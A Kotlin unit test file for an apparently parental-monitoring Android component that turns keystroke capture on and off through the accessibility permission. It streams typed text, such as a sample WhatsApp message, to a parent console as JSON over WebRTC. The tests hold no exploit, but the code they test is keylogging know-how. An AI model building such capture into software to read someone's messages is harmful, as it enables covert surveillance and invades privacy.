package com.nexus.child.components.keyboard

import org.junit.Assert.*
import org.junit.Before
import org.junit.Test

/**
 * Unit tests for KeyboardCommandHandler command routing, permission validation,
 * and WebRTC DataChannel telemetry packet generation.
 *
 * Hey friend! These tests verify that parent console commands (KEYBOARD_ON / KEYBOARD_OFF)
 * undergo strict validation and produce compliant JSON packets.
 */
class KeyboardCommandHandlerTest {

    private lateinit var fakeController: FakeKeyboardController
    private val sentMessages = mutableListOf<String>()
    private lateinit var commandHandler: KeyboardCommandHandler

    @Before
    fun setUp() {
        sentMessages.clear()
        fakeController = FakeKeyboardController()
        commandHandler = KeyboardCommandHandler(
            keyboardController = fakeController,
            dataSender = { msg ->
                sentMessages.add(msg)
                true
            }
        )
    }

    @Test
    fun testKeyboardOnSuccess() {
        fakeController.accessibilityGranted = true
        fakeController.mockRecentRecords.add(
            KeyboardRecord(
                id = "cached_1",
                app = "com.google.android.youtube",
                appName = "YouTube",
                text = "physics project simulation",
                inputType = "SEARCH",
                isPassword = false,
                timestamp = 1732015000000L
            )
        )

        val handled = commandHandler.handleCommand("KEYBOARD_ON")

        assertTrue(handled)
        assertTrue(fakeController.isMonitoring())
        assertEquals(2, sentMessages.size)
        assertEquals(KeyboardCommandHandler.RESP_KEYBOARD_STARTED, sentMessages[0])
        assertTrue(sentMessages[1].contains("\"type\":\"KEYBOARD_SNAPSHOT\""))
        assertTrue(sentMessages[1].contains("\"count\":1"))
        assertTrue(sentMessages[1].contains("physics project simulation"))
    }

    @Test
    fun testKeyboardOnPermissionDenied() {
        fakeController.accessibilityGranted = false

        val handled = commandHandler.handleCommand("KEYBOARD_ON")

        assertTrue(handled)
        assertFalse(fakeController.isMonitoring())
        assertEquals(1, sentMessages.size)
        assertTrue(sentMessages[0].startsWith(KeyboardCommandHandler.RESP_KEYBOARD_ERROR_PREFIX))
        assertTrue(sentMessages[0].contains("Accessibility permission not enabled"))
    }

    @Test
    fun testKeyboardOffSuccess() {
        fakeController.accessibilityGranted = true
        commandHandler.handleCommand("KEYBOARD_ON")
        sentMessages.clear()

        val handled = commandHandler.handleCommand("KEYBOARD_OFF")

        assertTrue(handled)
        assertFalse(fakeController.isMonitoring())
        assertEquals(1, sentMessages.size)
        assertEquals(KeyboardCommandHandler.RESP_KEYBOARD_STOPPED, sentMessages[0])
    }

    @Test
    fun testCommandAliases() {
        fakeController.accessibilityGranted = true

        assertTrue(commandHandler.handleCommand("KEYBOARD_START"))
        assertTrue(fakeController.isMonitoring())

        assertTrue(commandHandler.handleCommand("KEYBOARD_STOP"))
        assertFalse(fakeController.isMonitoring())

        assertTrue(commandHandler.handleCommand("START_KEYBOARD"))
        assertTrue(fakeController.isMonitoring())

        assertTrue(commandHandler.handleCommand("STOP_KEYBOARD"))
        assertFalse(fakeController.isMonitoring())
    }

    @Test
    fun testRealtimeKeystrokeEventDispatch() {
        fakeController.accessibilityGranted = true
        commandHandler.handleCommand("KEYBOARD_ON")
        sentMessages.clear()

        val record = KeyboardRecord(
            id = "live_99",
            app = "com.whatsapp",
            appName = "WhatsApp",
            text = "I am on my way home",
            fieldHint = "Message",
            fieldId = "com.whatsapp:id/entry",
            inputType = "MESSAGE",
            isPassword = false,
            timestamp = 1732016000000L
        )

        fakeController.triggerKeystroke(record)

        assertEquals(1, sentMessages.size)
        assertTrue(sentMessages[0].contains("\"type\":\"KEYBOARD_NEW\""))
        assertTrue(sentMessages[0].contains("\"appName\":\"WhatsApp\""))
        assertTrue(sentMessages[0].contains("\"text\":\"I am on my way home\""))
    }

    @Test
    fun testPeerDisconnectedHaltsMonitoring() {
        fakeController.accessibilityGranted = true
        commandHandler.handleCommand("KEYBOARD_ON")
        assertTrue(fakeController.isMonitoring())

        commandHandler.onPeerDisconnected()

        assertFalse(fakeController.isMonitoring())
    }

    @Test
    fun testUnhandledCommandReturnsFalse() {
        val handled = commandHandler.handleCommand("UNRECOGNIZED_ACTION")
        assertFalse(handled)
        assertTrue(sentMessages.isEmpty())
    }

    /**
     * Fake implementation of IKeyboardController for isolated unit testing.
     */
    private class FakeKeyboardController : IKeyboardController {
        var accessibilityGranted: Boolean = true
        private var monitoringActive: Boolean = false
        private var callback: ((KeyboardRecord) -> Unit)? = null
        val mockRecentRecords = mutableListOf<KeyboardRecord>()

        override fun hasAccessibilityPermission(): Boolean = accessibilityGranted

        override fun isMonitoring(): Boolean = monitoringActive

        override fun startMonitoring(onKeystroke: (KeyboardRecord) -> Unit): Boolean {
            if (!accessibilityGranted) return false
            monitoringActive = true
            this.callback = onKeystroke
            return true
        }

        override fun stopMonitoring(): Boolean {
            monitoringActive = false
            callback = null
            return true
        }

        override fun getRecentRecords(): List<KeyboardRecord> = mockRecentRecords.toList()

        fun triggerKeystroke(record: KeyboardRecord) {
            callback?.invoke(record)
        }

        override fun cleanup() {
            stopMonitoring()
            mockRecentRecords.clear()
        }
    }
}
